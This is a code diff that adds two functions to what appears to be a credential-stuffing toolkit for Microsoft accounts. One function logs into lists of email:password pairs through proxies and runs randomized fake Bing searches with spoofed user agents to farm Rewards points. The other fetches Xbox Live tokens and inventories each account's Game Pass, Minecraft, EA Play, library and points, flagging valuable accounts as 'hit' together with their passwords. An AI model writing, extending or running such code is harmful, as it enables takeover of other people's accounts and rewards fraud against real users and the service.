@@ -696,10 +696,326 @@ async function scanEntitlements(accounts, threads = 10, onProgress, signal) {
 }
 
 
+// ════════════════════════════════════════════════════════════
+//  6. REWARDS AUTO-FARMER — Automated Bing searches for points
+// ════════════════════════════════════════════════════════════
+
+const SEARCH_WORDS = [
+  "best games 2025", "weather today", "news headlines", "xbox game pass deals",
+  "how to cook pasta", "top movies streaming", "python tutorial", "javascript tips",
+  "cryptocurrency news", "fitness tips", "travel destinations 2025", "AI technology",
+  "best laptops 2025", "recipe ideas dinner", "workout routines", "space exploration",
+  "electric vehicles", "music playlist", "book recommendations", "sports scores today",
+  "home improvement tips", "gardening guide", "digital art tutorial", "stock market today",
+  "healthy breakfast ideas", "dog training tips", "photography basics", "climate change",
+  "meditation techniques", "best podcasts 2025", "coding challenges", "online courses free",
+  "budget travel tips", "interior design ideas", "smartphone reviews", "hiking trails near me",
+  "DIY crafts easy", "sustainable living", "car maintenance tips", "history facts interesting",
+  "science discoveries", "vegan recipes easy", "yoga for beginners", "gaming news latest",
+  "mental health tips", "remote work tools", "investment strategies", "language learning apps",
+  "best documentaries", "productivity hacks",
+];
+
+const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0";
+const MOBILE_UA = "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 EdgA/125.0.0.0";
+
+async function farmRewards(accounts, threads = 3, onProgress, signal) {
+  const results = await runPool({
+    items: accounts,
+    concurrency: threads,
+    maxRetries: 0,
+    signal,
+    scope: "rewards-farm",
+    runner: async (cred, ctx) => {
+      const sep = cred.indexOf(":");
+      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
+      const email = cred.slice(0, sep);
+      const password = cred.slice(sep + 1);
+
+      const login = await loginAccount(email, password, ctx.signal);
+      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };
+
+      const { jar } = login;
+
+      // Get initial points
+      let pointsBefore = 0;
+      try {
+        const r0 = await proxiedFetch("https://rewards.bing.com/", {
+          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
+          signal: ctx.signal,
+        });
+        const src0 = await r0.text();
+        pointsBefore = parseInt(parseLR(src0, ',"availablePoints":', ',"') || "0", 10);
+      } catch {}
+
+      // Perform desktop searches (30)
+      let desktopDone = 0;
+      const shuffled = [...SEARCH_WORDS].sort(() => Math.random() - 0.5);
+      for (let i = 0; i < 33; i++) {
+        if (ctx.signal?.aborted) break;
+        const query = shuffled[i % shuffled.length] + " " + Math.random().toString(36).slice(2, 6);
+        try {
+          await proxiedFetch(`https://www.bing.com/search?q=${encodeURIComponent(query)}&form=QBLH`, {
+            headers: {
+              "User-Agent": DESKTOP_UA,
+              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+              "Accept-Language": "en-US,en;q=0.5",
+              Cookie: jar.header(),
+            },
+            signal: ctx.signal,
+          });
+          desktopDone++;
+        } catch {}
+        await delay(1500 + Math.random() * 2000); // 1.5-3.5s between searches
+      }
+
+      // Perform mobile searches (23)
+      let mobileDone = 0;
+      const shuffled2 = [...SEARCH_WORDS].sort(() => Math.random() - 0.5);
+      for (let i = 0; i < 23; i++) {
+        if (ctx.signal?.aborted) break;
+        const query = shuffled2[i % shuffled2.length] + " " + Math.random().toString(36).slice(2, 6);
+        try {
+          await proxiedFetch(`https://www.bing.com/search?q=${encodeURIComponent(query)}&form=QBLH`, {
+            headers: {
+              "User-Agent": MOBILE_UA,
+              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+              "Accept-Language": "en-US,en;q=0.5",
+              Cookie: jar.header(),
+            },
+            signal: ctx.signal,
+          });
+          mobileDone++;
+        } catch {}
+        await delay(1500 + Math.random() * 2000);
+      }
+
+      // Check points after
+      let pointsAfter = 0;
+      try {
+        const r1 = await proxiedFetch("https://rewards.bing.com/", {
+          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
+          signal: ctx.signal,
+        });
+        const src1 = await r1.text();
+        pointsAfter = parseInt(parseLR(src1, ',"availablePoints":', ',"') || "0", 10);
+      } catch {}
+
+      const earned = pointsAfter - pointsBefore;
+
+      return {
+        result: {
+          status: earned > 0 ? "farmed" : "done",
+          user: email,
+          pointsBefore,
+          pointsAfter,
+          earned,
+          desktopSearches: desktopDone,
+          mobileSearches: mobileDone,
+        },
+      };
+    },
+    onResult: (r, done, total) => {
+      if (onProgress) onProgress(done, total, r);
+    },
+  });
+
+  return results.filter(Boolean);
+}
+
+
+// ════════════════════════════════════════════════════════════
+//  7. CROSS-SERVICE BRIDGE — Check linked services via Xbox
+// ════════════════════════════════════════════════════════════
+
+async function scanLinkedServices(accounts, threads = 10, onProgress, signal) {
+  const results = await runPool({
+    items: accounts,
+    concurrency: threads,
+    maxRetries: 1,
+    signal,
+    scope: "service-bridge",
+    runner: async (cred, ctx) => {
+      const sep = cred.indexOf(":");
+      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
+      const email = cred.slice(0, sep);
+      const password = cred.slice(sep + 1);
+
+      const login = await loginAccount(email, password, ctx.signal);
+      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };
+
+      const { jar } = login;
+
+      // Get XBL tokens for Xbox API access
+      let xblAuth = "", uhs = "";
+      try {
+        // Xbox Live RPS token
+        const xblOauth = "https://login.live.com/oauth20_authorize.srf" +
+          "?client_id=0000000048093EE3" +
+          "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
+          "&response_type=token" +
+          "&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL" +
+          "&prompt=none";
+
+        const { finalUrl: xUrl } = await sessionFetch(xblOauth, {
+          headers: {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+            "Accept": "text/html,*/*",
+            "Referer": "https://login.live.com/",
+          },
+        }, jar, ctx.signal);
+
+        const rpsToken = decodeURIComponent(parseLR(xUrl, "access_token=", "&token_type") || "");
+        if (!rpsToken) return { result: { status: "fail", user: email, reason: "XBL Token Fail" } };
+
+        // XBL User Token
+        const xblRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "x-xbl-contract-version": "1" },
+          body: JSON.stringify({
+            RelyingParty: "http://auth.xboxlive.com",
+            TokenType: "JWT",
+            Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${rpsToken}` },
+          }),
+          signal: ctx.signal,
+        });
+        const xblData = await xblRes.json();
+        const userToken = xblData.Token;
+        uhs = xblData.DisplayClaims?.xui?.[0]?.uhs || "";
+
+        // XSTS Token
+        const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            RelyingParty: "http://xboxlive.com",
+            TokenType: "JWT",
+            Properties: { UserTokens: [userToken], SandboxId: "RETAIL" },
+          }),
+          signal: ctx.signal,
+        });
+        const xstsData = await xstsRes.json();
+        xblAuth = `XBL3.0 x=${uhs};${xstsData.Token}`;
+      } catch {
+        return { result: { status: "fail", user: email, reason: "Xbox Auth Fail" } };
+      }
+
+      const xHeaders = {
+        "Authorization": xblAuth,
+        "x-xbl-contract-version": "2",
+        "Accept": "application/json",
+        "Accept-Language": "en-US",
+      };
+
+      // Check linked services
+      const services = {};
+
+      // Xbox Profile
+      try {
+        const profRes = await proxiedFetch(
+          `https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,Gamerscore,AccountTier,XboxOneRep`,
+          { headers: xHeaders, signal: ctx.signal }
+        );
+        if (profRes.ok) {
+          const profData = await profRes.json();
+          const settings = profData.profileUsers?.[0]?.settings || [];
+          services.Xbox = {
+            linked: true,
+            gamertag: settings.find(s => s.id === "Gamertag")?.value || "N/A",
+            gamerscore: settings.find(s => s.id === "Gamerscore")?.value || "0",
+            tier: settings.find(s => s.id === "AccountTier")?.value || "N/A",
+            rep: settings.find(s => s.id === "XboxOneRep")?.value || "N/A",
+          };
+        }
+      } catch {}
+
+      // Game Pass / Subscriptions
+      try {
+        const gpRes = await proxiedFetch(
+          "https://emerald.xboxservices.com/xboxcomfd/v3/offers?market=US&language=en-US",
+          { headers: { ...xHeaders, "x-xbl-contract-version": "4" }, signal: ctx.signal }
+        );
+        if (gpRes.ok) {
+          const gpData = await gpRes.json();
+          const offers = gpData.offers || gpData.Offers || [];
+          services.GamePass = {
+            linked: offers.length > 0,
+            offerCount: offers.length,
+            titles: offers.slice(0, 5).map(o => o.title || o.Title || "Perk").join(", "),
+          };
+        }
+      } catch {}
+
+      // Minecraft (check via title history)
+      try {
+        const mcRes = await proxiedFetch(
+          "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/achievement,stats",
+          { headers: { ...xHeaders, "x-xbl-contract-version": "2" }, signal: ctx.signal }
+        );
+        if (mcRes.ok) {
+          const mcData = await mcRes.json();
+          const titles = mcData.titles || [];
+          const minecraft = titles.find(t =>
+            (t.name || "").toLowerCase().includes("minecraft") ||
+            (t.titleId === "1739947436") || (t.titleId === "1810924247")
+          );
+          services.Minecraft = { linked: !!minecraft, title: minecraft?.name || "Not Found" };
+
+          // EA Play detection
+          const ea = titles.find(t =>
+            (t.name || "").toLowerCase().includes("ea play") ||
+            (t.name || "").toLowerCase().includes("ea access")
+          );
+          services.EAPlay = { linked: !!ea, title: ea?.name || "Not Found" };
+
+          // Total games
+          services.Library = {
+            totalGames: titles.length,
+            recent: titles.slice(0, 5).map(t => t.name || "Unknown").join(", "),
+          };
+        }
+      } catch {}
+
+      // Rewards points (already have session)
+      try {
+        const rwRes = await proxiedFetch("https://rewards.bing.com/", {
+          headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
+          signal: ctx.signal,
+        });
+        const rwSrc = await rwRes.text();
+        services.Rewards = {
+          linked: true,
+          points: parseLR(rwSrc, ',"availablePoints":', ',"') || "0",
+        };
+      } catch {}
+
+      const linkedCount = Object.values(services).filter(s => s && s.linked).length;
+
+      return {
+        result: {
+          status: linkedCount > 0 ? "hit" : "empty",
+          user: email,
+          password: password,
+          services,
+          linkedCount,
+        },
+      };
+    },
+    onResult: (r, done, total) => {
+      if (onProgress) onProgress(done, total, r);
+    },
+  });
+
+  return results.filter(Boolean);
+}
+
+
 module.exports = {
   snipeRegionalPrices,
   ghostRedeemCodes,
   mineReceipts,
   scanPaymentArsenal,
   scanEntitlements,
+  farmRewards,
+  scanLinkedServices,
 };
